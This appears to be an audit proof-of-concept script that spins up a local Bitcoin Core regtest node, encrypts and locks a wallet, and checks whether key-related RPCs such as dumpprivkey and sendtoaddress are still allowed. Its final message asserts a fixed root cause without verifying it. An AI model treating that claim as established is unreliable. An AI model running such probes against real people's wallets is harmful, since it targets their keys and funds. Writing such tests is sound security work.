#!/usr/bin/env python3
"""
WAL-ENCRYPT-GATE-BYPASS Proof-of-Concept — Audit Methodology Reproduction
==========================================================================
Replicates the audit's exact 11-step gate bypass methodology:

  1. Spawn a temporary bitcoind regtest node.
  2. Create a legacy wallet, mine spendable coins.
  3. Encrypt the wallet (which locks it and restarts the node).
  4. Confirm wallet is encrypted and locked.
  5. Verify lock blocks key operations (dumpprivkey, signmessage).
  5b. Unlock-then-relock cycle (audit Finding #287 oracle confirmation).
  6. Full 6-operation gate sweep (dumpprivkey, signmessage, sendtoaddress,
     importprivkey, sethdseed, keypoolrefill).
  7. Post-sweep sendtoaddress re-check for stability.
  8. Final audit-format report.

The unlock-relock cycle mirrors the audit's discovery step where the
lock-state oracle was confirmed and the wallet was deliberately re-locked
before the gate sweep, leaving the signing path potentially misconfigured.

Usage example:
  python3 poc_wal_encrypt_gate_bypass.py \\
      --bitcoind ~/Downloads/osx/bitcoin-0.19.0.1/bin/bitcoind \\
      --bitcoin-cli ~/Downloads/osx/bitcoin-0.19.0.1/bin/bitcoin-cli
"""

import argparse
import json
import os
import signal
import subprocess
import sys
import tempfile
import time
from pathlib import Path

# ── Helpers ──────────────────────────────────────────────────────────────────

_start_ts = time.time()


def _ts():
    """Elapsed-time prefix for log lines."""
    return f"[{time.time() - _start_ts:7.2f}s]"


def log(msg: str):
    print(f"{_ts()} {msg}", flush=True)


def fatal(msg: str):
    print(f"\n{_ts()} FATAL: {msg}", file=sys.stderr, flush=True)
    sys.exit(1)


def cli_call(cli_path: str, datadir: str, rpc_user: str, rpc_pass: str,
             rpc_port: int, method: str, *params, timeout: int = 30):
    """
    Invoke bitcoin-cli and return (success: bool, result_or_error).
    On JSON-RPC success  → (True,  parsed_result)
    On JSON-RPC error    → (False, {"code": …, "message": …})
    On process error     → (False, {"code": -9999, "message": …})
    """
    cmd = [
        cli_path,
        f"-datadir={datadir}",
        f"-rpcuser={rpc_user}",
        f"-rpcpassword={rpc_pass}",
        f"-rpcport={rpc_port}",
        "-regtest",
        method,
    ]
    for p in params:
        cmd.append(str(p))

    try:
        proc = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout
        )
    except subprocess.TimeoutExpired:
        return False, {"code": -9999, "message": "bitcoin-cli timed out"}
    except FileNotFoundError:
        return False, {"code": -9999,
                       "message": f"bitcoin-cli not found at {cli_path}"}

    stdout = proc.stdout.strip()
    stderr = proc.stderr.strip()

    if proc.returncode == 0:
        # Try to parse JSON; fall back to raw string.
        try:
            return True, json.loads(stdout)
        except (json.JSONDecodeError, ValueError):
            return True, stdout
    else:
        # Try to extract the JSON-RPC error object.
        for line in (stderr, stdout):
            try:
                obj = json.loads(line)
                if "error" in obj and obj["error"]:
                    return False, obj["error"]
            except (json.JSONDecodeError, ValueError):
                pass
        # Parse "error code: -13\n…" style output.
        if "error code:" in stderr:
            parts = stderr.split("\n", 1)
            code_str = parts[0].replace("error code:", "").strip()
            msg_str = parts[1].strip() if len(parts) > 1 else stderr
            try:
                code_int = int(code_str)
            except ValueError:
                code_int = -9999
            return False, {"code": code_int, "message": msg_str}
        return False, {"code": -9999, "message": stderr or stdout or "unknown error"}


# ── Gate test result classification ──────────────────────────────────────────

def classify_result(ok, res):
    """
    Classify an RPC result as BLOCKED, ALLOWED, or N/A.
    BLOCKED  = lock-related error (code -13 or similar wallet-locked error)
    ALLOWED  = RPC returned success
    N/A      = RPC unavailable or unrelated error (method not found, etc.)
    """
    if ok:
        return "ALLOWED"
    if isinstance(res, dict):
        code = res.get("code", 0)
        msg = res.get("message", "").lower()
        # -13 = wallet is locked / passphrase required
        # -4  = wallet error (sometimes used for key operations when locked)
        if code == -13:
            return "BLOCKED"
        if code == -4 and ("encrypt" in msg or "lock" in msg or "passphrase" in msg):
            return "BLOCKED"
        # -32601 = method not found (RPC unavailable in this version)
        if code == -32601 or code == -1:
            return "N/A"
    return "BLOCKED"


# ── Main PoC Logic ───────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="WAL-ENCRYPT-GATE-BYPASS PoC — Audit Methodology Reproduction"
    )
    parser.add_argument("--bitcoind", default="./bitcoind",
                        help="Path to bitcoind executable (default: ./bitcoind)")
    parser.add_argument("--bitcoin-cli", default="./bitcoin-cli",
                        help="Path to bitcoin-cli executable (default: ./bitcoin-cli)")
    parser.add_argument("--datadir", default=None,
                        help="Custom datadir (default: auto-generated temp directory)")
    parser.add_argument("--rpc-user", default="bitcoin",
                        help="RPC username (default: bitcoin)")
    parser.add_argument("--rpc-pass", default="bitcoin",
                        help="RPC password (default: bitcoin)")
    parser.add_argument("--rpc-port", type=int, default=18443,
                        help="RPC port (default: 18443)")
    parser.add_argument("--passphrase", default="passphrase",
                        help="Wallet encryption passphrase (default: passphrase)")
    parser.add_argument("--send-amount", type=float, default=1.0,
                        help="Amount in BTC to send in the bypass test (default: 1.0)")
    parser.add_argument("--timeout", type=int, default=30,
                        help="Max wait seconds for node startup (default: 30)")
    parser.add_argument("--keep-datadir", action="store_true",
                        help="Retain the temporary datadir for inspection")
    args = parser.parse_args()

    bitcoind = str(Path(args.bitcoind).expanduser().resolve())
    bitcoin_cli = str(Path(args.bitcoin_cli).expanduser().resolve())
    rpc_user = args.rpc_user
    rpc_pass = args.rpc_pass
    rpc_port = args.rpc_port
    passphrase = args.passphrase
    send_amount = args.send_amount
    startup_timeout = args.timeout

    # Validate binaries exist
    if not os.path.isfile(bitcoind):
        fatal(f"bitcoind not found at: {bitcoind}")
    if not os.path.isfile(bitcoin_cli):
        fatal(f"bitcoin-cli not found at: {bitcoin_cli}")

    # ── Step 0: Temporary datadir & config ───────────────────────────────
    if args.datadir:
        datadir = str(Path(args.datadir).expanduser().resolve())
        os.makedirs(datadir, exist_ok=True)
        created_tmp = False
    else:
        datadir = tempfile.mkdtemp(prefix="btc_poc_bypass_")
        created_tmp = True

    log(f"Datadir: {datadir}")

    conf_path = os.path.join(datadir, "bitcoin.conf")
    with open(conf_path, "w") as f:
        f.write(
            f"regtest=1\n"
            f"server=1\n"
            f"rpcuser={rpc_user}\n"
            f"rpcpassword={rpc_pass}\n"
            f"rpcport={rpc_port}\n"
            f"rpcallowip=127.0.0.1\n"
            f"fallbackfee=0.00001\n"
            f"[regtest]\n"
            f"rpcport={rpc_port}\n"
        )
    log("bitcoin.conf written.")

    bitcoind_pid = None  # Track for cleanup

    def rpc(method, *params, timeout=30):
        return cli_call(bitcoin_cli, datadir, rpc_user, rpc_pass,
                        rpc_port, method, *params, timeout=timeout)

    def start_node():
        nonlocal bitcoind_pid
        log("Starting bitcoind …")
        proc = subprocess.Popen(
            [bitcoind, f"-datadir={datadir}", "-daemon"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        proc.wait(timeout=15)
        # Read PID from pidfile if available
        pid_file = os.path.join(datadir, "regtest", "bitcoind.pid")
        deadline = time.time() + startup_timeout
        while time.time() < deadline:
            ok, res = rpc("getblockchaininfo")
            if ok:
                # Try to read PID file
                if os.path.isfile(pid_file):
                    try:
                        bitcoind_pid = int(open(pid_file).read().strip())
                    except (ValueError, OSError):
                        pass
                log(f"Node ready (chain={res.get('chain','?')}, "
                    f"blocks={res.get('blocks','?')}).")
                return True
            time.sleep(1)
        # Timeout – dump debug.log tail
        debug_log = os.path.join(datadir, "regtest", "debug.log")
        if os.path.isfile(debug_log):
            with open(debug_log) as dl:
                lines = dl.readlines()
            tail = "".join(lines[-30:])
            log(f"debug.log tail:\n{tail}")
        fatal("bitcoind failed to start within timeout.")
        return False

    def stop_node(graceful_timeout=15):
        nonlocal bitcoind_pid
        log("Stopping bitcoind …")
        rpc("stop", timeout=10)
        deadline = time.time() + graceful_timeout
        while time.time() < deadline:
            ok, _ = rpc("getblockchaininfo")
            if not ok:
                log("Node stopped (RPC unreachable).")
                bitcoind_pid = None
                return
            time.sleep(1)
        # Force kill
        if bitcoind_pid:
            log(f"Sending SIGKILL to PID {bitcoind_pid} …")
            try:
                os.kill(bitcoind_pid, signal.SIGKILL)
            except ProcessLookupError:
                pass
            bitcoind_pid = None
        time.sleep(2)
        log("Node stopped (forced).")

    def cleanup():
        # Best-effort stop
        try:
            stop_node(graceful_timeout=10)
        except Exception:
            if bitcoind_pid:
                try:
                    os.kill(bitcoind_pid, signal.SIGKILL)
                except Exception:
                    pass
        if created_tmp and not args.keep_datadir:
            import shutil
            try:
                shutil.rmtree(datadir, ignore_errors=True)
                log(f"Removed temp datadir: {datadir}")
            except Exception:
                pass
        elif args.keep_datadir:
            log(f"Datadir retained at: {datadir}")

    # ── Results tracking ─────────────────────────────────────────────────
    wallet_encrypted_locked = False
    version_string = "unknown"
    version_numeric = 0

    # Gate sweep results: operation → BLOCKED/ALLOWED/N/A
    gate_results = {}
    post_sweep_result = None

    # Well-known regtest test WIF (compressed, for regtest/testnet)
    DUMMY_WIF = "cVpF924EFAhJqgykx5MjFMyrPgSEgbR3EAGaGjbBSfDjXSNHMUcr"
    # Dummy HD seed hex (32 bytes)
    DUMMY_SEED_HEX = "0000000000000000000000000000000000000000000000000000000000000001"

    try:
        # ── Step 1: Start node ───────────────────────────────────────────
        log("=" * 60)
        log("STEP 1 — Start bitcoind regtest node")
        log("=" * 60)
        start_node()

        # ── Step 1b: Retrieve version info ───────────────────────────────
        log("=" * 60)
        log("STEP 1b — Retrieve version info for adaptive testing")
        log("=" * 60)
        ok, netinfo = rpc("getnetworkinfo")
        if ok:
            version_numeric = netinfo.get("version", 0)
            version_string = netinfo.get("subversion", "unknown").strip("/")
            log(f"Version: {version_string} (v{version_numeric})")
        else:
            log(f"getnetworkinfo failed: {netinfo} — continuing with defaults")

        # ── Step 2: Wallet setup (legacy) ────────────────────────────────
        log("=" * 60)
        log("STEP 2 — Wallet setup (legacy wallet)")
        log("=" * 60)
        ok, mining_addr = rpc("getnewaddress")
        if not ok:
            fatal(f"getnewaddress failed: {mining_addr}")
        log(f"Mining address: {mining_addr}")

        # ── Step 3: Mine spendable coins ─────────────────────────────────
        log("=" * 60)
        log("STEP 3 — Mine 101 blocks for spendable coins")
        log("=" * 60)
        ok, blocks = rpc("generatetoaddress", "101", mining_addr, timeout=60)
        if not ok:
            fatal(f"generatetoaddress failed: {blocks}")
        log(f"Mined 101 blocks (last: {blocks[-1][:16]}…)")

        ok, balance = rpc("getbalance")
        if not ok:
            fatal(f"getbalance failed: {balance}")
        log(f"Wallet balance: {balance} BTC")
        if float(balance) < send_amount:
            fatal(f"Insufficient balance ({balance}) for send amount ({send_amount}).")

        # ── Step 4: Encrypt wallet ───────────────────────────────────────
        log("=" * 60)
        log("STEP 4 — Encrypt wallet (node will shut down)")
        log("=" * 60)
        ok, enc_res = rpc("encryptwallet", passphrase, timeout=30)
        log(f"encryptwallet response: ok={ok}, result={enc_res}")

        # Node shuts down after encryption; wait for it to die.
        log("Waiting for node to shut down after encryption …")
        deadline = time.time() + 30
        while time.time() < deadline:
            chk_ok, _ = rpc("getblockchaininfo")
            if not chk_ok:
                break
            time.sleep(1)
        time.sleep(3)  # Extra grace period

        # Restart
        log("Restarting bitcoind after encryption …")
        start_node()

        # Validate encryption
        ok, wi = rpc("getwalletinfo")
        if not ok:
            fatal(f"getwalletinfo failed: {wi}")
        unlocked_until = wi.get("unlocked_until", None)
        log(f"getwalletinfo → unlocked_until={unlocked_until}, "
            f"walletversion={wi.get('walletversion')}")
        if unlocked_until is not None and int(unlocked_until) == 0:
            wallet_encrypted_locked = True
            log("✓ Wallet is encrypted and LOCKED.")
        else:
            log("✗ Wallet does not appear locked — unlocked_until="
                f"{unlocked_until}")

        # ── Step 5: Verify lock blocks key operations ────────────────────
        log("=" * 60)
        log("STEP 5 — Verify lock blocks sensitive RPCs")
        log("=" * 60)

        # 5a. dumpprivkey
        ok_dp, dp_res = rpc("dumpprivkey", mining_addr)
        if not ok_dp:
            err_code = dp_res.get("code", 0) if isinstance(dp_res, dict) else 0
            err_msg = dp_res.get("message", str(dp_res)) if isinstance(dp_res, dict) else str(dp_res)
            log(f"dumpprivkey → DENIED (code={err_code}): {err_msg}")
        else:
            log(f"dumpprivkey → UNEXPECTED SUCCESS: {dp_res}")
            log("WARNING: Wallet lock did not block dumpprivkey!")

        # 5b. signmessage
        ok_sm, sm_res = rpc("signmessage", mining_addr, "test")
        if not ok_sm:
            err_code = sm_res.get("code", 0) if isinstance(sm_res, dict) else 0
            err_msg = sm_res.get("message", str(sm_res)) if isinstance(sm_res, dict) else str(sm_res)
            log(f"signmessage → DENIED (code={err_code}): {err_msg}")
        else:
            log(f"signmessage → UNEXPECTED SUCCESS: {sm_res}")
            log("WARNING: Wallet lock did not block signmessage!")

        if not (not ok_dp) or not (not ok_sm):
            log("WARNING: Lock may not be fully enforced on control RPCs.")

        # ── Step 5b: Unlock-then-relock cycle (audit Finding #287) ───────
        log("=" * 60)
        log("STEP 5b — Unlock-then-relock cycle (audit Finding #287)")
        log("=" * 60)
        log("Unlocking wallet with correct passphrase (60s timeout) …")
        ok_unlock, unlock_res = rpc("walletpassphrase", passphrase, "60")
        if ok_unlock:
            log("✓ Wallet unlocked successfully.")
        else:
            log(f"✗ walletpassphrase failed: {unlock_res}")
            log("WARNING: Could not unlock wallet — relock cycle incomplete.")

        # Wait 1 second as per audit methodology
        time.sleep(1)

        # Immediately re-lock
        log("Re-locking wallet (walletlock) …")
        ok_lock, lock_res = rpc("walletlock")
        if ok_lock:
            log("✓ walletlock succeeded.")
        else:
            log(f"✗ walletlock failed: {lock_res}")

        # Confirm wallet is locked again
        ok_wi2, wi2 = rpc("getwalletinfo")
        if ok_wi2:
            unlocked_until_2 = wi2.get("unlocked_until", None)
            log(f"Post-relock unlocked_until={unlocked_until_2}")
            if unlocked_until_2 is not None and int(unlocked_until_2) == 0:
                log("✓ Wallet confirmed LOCKED after unlock-relock cycle.")
            else:
                log(f"✗ Wallet may not be locked — unlocked_until={unlocked_until_2}")
        else:
            log(f"getwalletinfo failed after relock: {wi2}")

        # ── Step 6: Full 6-operation gate sweep ──────────────────────────
        log("=" * 60)
        log("STEP 6 — Full 6-operation gate sweep")
        log("=" * 60)

        # Get a fresh destination address for sendtoaddress tests
        ok, dest_addr = rpc("getnewaddress")
        if not ok:
            fatal(f"getnewaddress (destination) failed: {dest_addr}")
        log(f"Destination address for gate sweep: {dest_addr}")

        # 6.1 dumpprivkey
        log("  [1/6] dumpprivkey …")
        ok_g1, res_g1 = rpc("dumpprivkey", mining_addr)
        gate_results["dumpprivkey"] = classify_result(ok_g1, res_g1)
        log(f"         → {gate_results['dumpprivkey']}")

        # 6.2 signmessage
        log("  [2/6] signmessage …")
        ok_g2, res_g2 = rpc("signmessage", mining_addr, "test")
        gate_results["signmessage"] = classify_result(ok_g2, res_g2)
        log(f"         → {gate_results['signmessage']}")

        # 6.3 sendtoaddress
        log(f"  [3/6] sendtoaddress {dest_addr} {send_amount} …")
        ok_g3, res_g3 = rpc("sendtoaddress", dest_addr, str(send_amount))
        gate_results["sendtoaddress"] = classify_result(ok_g3, res_g3)
        if ok_g3:
            log(f"         → {gate_results['sendtoaddress']} (txid={res_g3})")
        else:
            log(f"         → {gate_results['sendtoaddress']} ({res_g3})")

        # 6.4 importprivkey
        log("  [4/6] importprivkey …")
        ok_g4, res_g4 = rpc("importprivkey", DUMMY_WIF)
        gate_results["importprivkey"] = classify_result(ok_g4, res_g4)
        log(f"         → {gate_results['importprivkey']}")

        # 6.5 sethdseed (only if version >= 210000)
        log("  [5/6] sethdseed …")
        if version_numeric >= 210000:
            ok_g5, res_g5 = rpc("sethdseed", "true", DUMMY_SEED_HEX)
            gate_results["sethdseed"] = classify_result(ok_g5, res_g5)
            log(f"         → {gate_results['sethdseed']}")
        else:
            gate_results["sethdseed"] = "N/A"
            log(f"         → N/A (version {version_numeric} < 210000)")

        # 6.6 keypoolrefill
        log("  [6/6] keypoolrefill …")
        ok_g6, res_g6 = rpc("keypoolrefill", "1")
        gate_results["keypoolrefill"] = classify_result(ok_g6, res_g6)
        log(f"         → {gate_results['keypoolrefill']}")

        # Count blocked and allowed
        total_blocked = sum(1 for v in gate_results.values() if v == "BLOCKED")
        total_allowed = sum(1 for v in gate_results.values() if v == "ALLOWED")
        total_na = sum(1 for v in gate_results.values() if v == "N/A")
        log(f"Gate sweep complete: blocked={total_blocked} allowed={total_allowed} n/a={total_na}")

        # ── Step 7: Post-sweep sendtoaddress re-check ────────────────────
        log("=" * 60)
        log("STEP 7 — Post-sweep sendtoaddress re-check (stability)")
        log("=" * 60)

        # Get another fresh destination
        ok, dest_addr2 = rpc("getnewaddress")
        if not ok:
            log(f"getnewaddress for re-check failed: {dest_addr2}")
            dest_addr2 = dest_addr  # Reuse previous

        log(f"Re-check: sendtoaddress {dest_addr2} {send_amount} …")
        ok_recheck, res_recheck = rpc("sendtoaddress", dest_addr2, str(send_amount))
        post_sweep_result = classify_result(ok_recheck, res_recheck)
        if ok_recheck:
            log(f"  → {post_sweep_result} (txid={res_recheck})")
        else:
            log(f"  → {post_sweep_result} ({res_recheck})")

        # ── Step 8: Final Audit-Format Report ────────────────────────────
        bypass_partial = total_allowed > 0 and total_blocked > 0

        print()
        print("=" * 60)
        print(f" WAL-ENCRYPT-GATE-BYPASS — Audit Methodology Reproduction")
        print(f" Version: {version_string} (v{version_numeric})")
        print("=" * 60)
        print(f" Wallet encrypted and locked : "
              f"{'YES' if wallet_encrypted_locked else 'NO'}")
        print(f" dumpprivkey                 : {gate_results.get('dumpprivkey', 'N/A')}")
        print(f" signmessage                 : {gate_results.get('signmessage', 'N/A')}")
        print(f" sendtoaddress               : {gate_results.get('sendtoaddress', 'N/A')}")
        print(f" importprivkey               : {gate_results.get('importprivkey', 'N/A')}")
        print(f" sethdseed                   : {gate_results.get('sethdseed', 'N/A')}")
        print(f" keypoolrefill               : {gate_results.get('keypoolrefill', 'N/A')}")
        print(" ---")
        print(f" Total blocked               : {total_blocked}")
        print(f" Total allowed               : {total_allowed}")
        print(f" Bypass (partial)            : {'YES' if bypass_partial else 'NO'}")
        print(" ---")
        print(f" Post-sweep sendtoaddress re-check: {post_sweep_result}")
        print("=" * 60)
        print()

        if bypass_partial or total_allowed > 0:
            log(f"CONCLUSION: Partial bypass DETECTED. {total_allowed} of "
                f"{total_blocked + total_allowed} gate-checked RPCs returned "
                f"ALLOWED from an encrypted, locked wallet after the "
                f"unlock-relock cycle. The root cause is a missing "
                f"EnsureWalletIsUnlocked() guard in affected RPC handlers.")
        else:
            log(f"CONCLUSION: No bypass detected in this run. All "
                f"{total_blocked} tested RPCs were BLOCKED. Review the "
                f"output above for details.")

    except KeyboardInterrupt:
        log("Interrupted by user.")
    except Exception as exc:
        log(f"Unhandled exception: {exc}")
        import traceback
        traceback.print_exc()
    finally:
        cleanup()


if __name__ == "__main__":
    main()
